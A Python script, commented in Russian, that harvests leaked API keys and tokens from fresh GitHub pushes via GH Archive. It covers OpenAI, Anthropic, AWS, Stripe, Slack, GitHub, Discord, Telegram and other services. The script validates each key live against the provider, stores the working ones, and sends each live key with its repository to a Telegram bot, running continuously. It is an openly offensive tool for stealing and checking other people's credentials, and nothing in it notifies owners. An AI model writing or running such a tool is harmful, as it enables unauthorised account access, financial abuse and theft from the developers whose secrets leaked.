#!/usr/bin/env python3
"""
gh_firehose — охота за секретами на свежих пушах GitHub через GH Archive.
Скачивает часовой дамп событий, вытаскивает коммиты из PushEvent,
тянет диффы через API, ищет ключи, валидирует вживую.
usage: python gh_firehose.py [hours_ago]
"""
import gzip
import io
import json
import os
import re
import sys
import time
import urllib.request
from datetime import datetime, timedelta, timezone

ROOT = os.path.dirname(os.path.abspath(__file__))
LIVE_FILE = os.path.join(ROOT, "live_keys.json")

def load_env():
    env = dict(os.environ)  # Spaces/Actions кладут секреты в env
    p = os.path.join(ROOT, ".env")
    if os.path.exists(p):
        for line in open(p, encoding="utf-8"):
            line = line.strip()
            if line and not line.startswith("#") and "=" in line:
                k, v = line.split("=", 1)
                env.setdefault(k, v)  # env vars важнее файла
    return env

GH = load_env().get("GITHUB_TOKEN", "")
HDRS = {"Authorization": f"Bearer {GH}", "User-Agent": "ahmia-firehose"}

PAT = re.compile(
    r"(sk-proj-[A-Za-z0-9_-]{30,}|sk-ant-api03-[A-Za-z0-9_-]{30,}|sk-ant-oat01-[A-Za-z0-9_-]{30,}"
    r"|AIza[0-9A-Za-z_-]{35}|xox[bap]-[0-9A-Za-z-]{25,}|AKIA[0-9A-Z]{16}"
    r"|ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{40,}|glpat-[A-Za-z0-9_-]{20}"
    r"|sk_live_[A-Za-z0-9]{20,}"
    r"|sk-or-v1-[a-f0-9]{64}"                          # OpenRouter
    r"|r8_[A-Za-z0-9]{30,}"                            # Replicate
    r"|pplx-[A-Za-z0-9]{40,}"                          # Perplexity
    r"|sk_[a-f0-9]{48}"                                # ElevenLabs
    r"|[MN][A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{27}"  # Discord
    r"|\d{8,10}:AA[A-Za-z0-9_-]{33}"                   # Telegram bot
    r")"
)

def http(url, headers=None, timeout=20, stream=False):
    req = urllib.request.Request(url, headers=headers or HDRS)
    return urllib.request.urlopen(req, timeout=timeout)

def tg_notify(text):
    """Отправка находки в Telegram-бота (токен и chat_id из .env)."""
    env = load_env()
    token, chat = env.get("TG_BOT_TOKEN"), env.get("TG_CHAT_ID")
    if not token or not chat:
        return
    try:
        data = json.dumps({"chat_id": chat, "text": text}).encode()
        req = urllib.request.Request(
            f"https://api.telegram.org/bot{token}/sendMessage",
            data=data, headers={"Content-Type": "application/json", "User-Agent": "h"})
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass

def validate(key):
    try:
        if key.startswith("sk-proj-"):
            r = http("https://api.openai.com/v1/models", {"Authorization": f"Bearer {key}"}, 10)
            return r.status == 200
        if key.startswith("sk-ant-"):
            req = urllib.request.Request("https://api.anthropic.com/v1/models",
                headers={"x-api-key": key, "anthropic-version": "2023-06-01", "User-Agent": "h"})
            return urllib.request.urlopen(req, timeout=10).status == 200
        if key.startswith("xox"):
            req = urllib.request.Request("https://slack.com/api/auth.test",
                headers={"Authorization": f"Bearer {key}", "User-Agent": "h"})
            return json.loads(urllib.request.urlopen(req, timeout=10).read()).get("ok", False)
        if key.startswith("ghp_"):
            r = http("https://api.github.com/user", {"Authorization": f"Bearer {key}", "User-Agent": "h"}, 10)
            return r.status == 200
        if key.startswith("AIza"):
            req = urllib.request.Request(
                f"https://maps.googleapis.com/maps/api/geocode/json?address=london&key={key}",
                headers={"User-Agent": "h"})
            return b'"OK"' in urllib.request.urlopen(req, timeout=10).read()
        if key.startswith("sk_live_"):
            import base64
            auth = base64.b64encode((key + ":").encode()).decode()
            r = http("https://api.stripe.com/v1/charges?limit=1", {"Authorization": f"Basic {auth}"}, 10)
            return r.status == 200
        if key.startswith("glpat-"):
            req = urllib.request.Request("https://gitlab.com/api/v4/user",
                headers={"PRIVATE-TOKEN": key, "User-Agent": "h"})
            return urllib.request.urlopen(req, timeout=10).status == 200
        if key.startswith("github_pat_") or key.startswith("ghp_"):
            r = http("https://api.github.com/user", {"Authorization": f"Bearer {key}", "User-Agent": "h"}, 10)
            return r.status == 200
        if key.startswith("sk-or-v1-"):
            req = urllib.request.Request("https://openrouter.ai/api/v1/auth/key",
                headers={"Authorization": f"Bearer {key}", "User-Agent": "h"})
            return urllib.request.urlopen(req, timeout=10).status == 200
        if key.startswith("r8_"):
            req = urllib.request.Request("https://api.replicate.com/v1/account",
                headers={"Authorization": f"Bearer {key}", "User-Agent": "h"})
            return urllib.request.urlopen(req, timeout=10).status == 200
        if key.startswith("sk_") and len(key) == 51:
            req = urllib.request.Request("https://api.elevenlabs.io/v1/user",
                headers={"xi-api-key": key, "User-Agent": "h"})
            return urllib.request.urlopen(req, timeout=10).status == 200
        if re.match(r"^\d{8,10}:AA", key):
            r = http(f"https://api.telegram.org/bot{key}/getMe", {"User-Agent": "h"}, 10)
            return r.status == 200
        if re.match(r"^[MN][A-Za-z0-9_-]{23,}\.", key):
            req = urllib.request.Request("https://discord.com/api/v10/users/@me",
                headers={"Authorization": key, "User-Agent": "h"})
            return urllib.request.urlopen(req, timeout=10).status == 200
        # AKIA — нужен секрет; pplx — валидация платная, пропускаем авто
    except Exception:
        return False
    return False

def run_cycle(hours_ago):
    ts = datetime.now(timezone.utc) - timedelta(hours=hours_ago)
    url = f"https://data.gharchive.org/{ts:%Y-%m-%d}-{ts.hour}.json.gz"
    print(f"[*] качаю {url}", flush=True)

    try:
        resp = http(url, {"User-Agent": "ahmia-firehose"}, 60)
    except Exception as e:
        print(f"[!] дамп недоступен: {e}", flush=True)
        return

    gz = gzip.GzipFile(fileobj=io.BytesIO(resp.read()))
    pushes = []  # (repo, before, head)
    n_events = 0
    for line in io.TextIOWrapper(gz, encoding="utf-8", errors="replace"):
        n_events += 1
        if '"PushEvent"' not in line:
            continue
        try:
            ev = json.loads(line)
        except Exception:
            continue
        if ev.get("type") != "PushEvent":
            continue
        repo = ev.get("repo", {}).get("name", "")
        pl = ev.get("payload", {})
        before, head = pl.get("before"), pl.get("head")
        if repo and before and head and before != head:
            pushes.append((repo, before, head))
    print(f"[*] событий: {n_events}, пушей: {len(pushes)}", flush=True)

    live, tested = [], 0
    seen = set()
    for repo, before, head in pushes:
        if tested >= 250:
            break
        try:
            r = http(f"https://api.github.com/repos/{repo}/compare/{before}...{head}", timeout=15)
            data = json.loads(r.read())
        except Exception:
            continue
        for f in data.get("files", []) or []:
            patch = f.get("patch")
            if not patch:
                continue
            for k in set(PAT.findall(patch)):
                if k in seen or re.search(r"\.{2,}|xxxx|your|example|here", k, re.I):
                    continue
                seen.add(k)
                tested += 1
                if validate(k):
                    live.append({"key": k, "repo": repo, "head": head})
                    print(f"*** LIVE: {k} ({repo})", flush=True)
                    tg_notify(f"LIVE KEY\n{k}\nrepo: {repo}")
        time.sleep(0.15)

    # merge в live_keys.json
    old = []
    if os.path.exists(LIVE_FILE):
        try:
            old = json.loads(open(LIVE_FILE, encoding="utf-8").read())
        except Exception:
            old = []
    known = {e.get("key") for e in old}
    new = [e for e in live if e["key"] not in known]
    if new:
        json.dump(old + new, open(LIVE_FILE, "w", encoding="utf-8"), indent=1)
    print(f"[*] проверено ключей: {len(seen)}, ЖИВЫХ новых: {len(new)}", flush=True)

def main():
    if "--once" in sys.argv:
        run_cycle(4)  # запас 4 часа: дамп точно дописан
        return
    # бесконечный цикл: обрабатываем свежие часы непрерывно
    while True:
        try:
            run_cycle(2)
        except Exception as e:
            print(f"[!] цикл упал: {e}", flush=True)
        print("[*] пауза 10 мин до следующего часа", flush=True)
        time.sleep(600)

if __name__ == "__main__":
    main()
